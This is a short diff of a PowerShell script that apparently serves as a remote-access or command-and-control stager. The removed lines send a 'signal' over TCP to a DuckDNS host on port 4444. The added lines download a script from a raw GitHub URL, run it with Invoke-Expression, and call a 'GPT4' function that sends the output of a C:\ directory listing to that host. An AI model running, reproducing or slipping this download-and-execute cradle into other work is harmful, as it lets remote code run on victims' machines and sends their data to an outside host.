@@ -1,9 +1,5 @@
-$tcpClient = New-Object System.Net.Sockets.TcpClient("suber122.duckdns.org", 4444)
-$stream = $tcpClient.GetStream()
-$writer = New-Object System.IO.StreamWriter($stream)
-
-# Sinyal gönderme işlemi
-$writer.Write("signal")
-$writer.Flush()
-
-$tcpClient.Close()
+$IPAddress = "suber122.duckdns.org"
+$Port = 4444
+$Command = "Get-ChildItem C:\"
+Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/anilxpm/powerl/master/gpt4.ps1') | Out-Null
+GPT4 -Mode sender -IPAddress $IPAddress -Port $Port -Command $Command
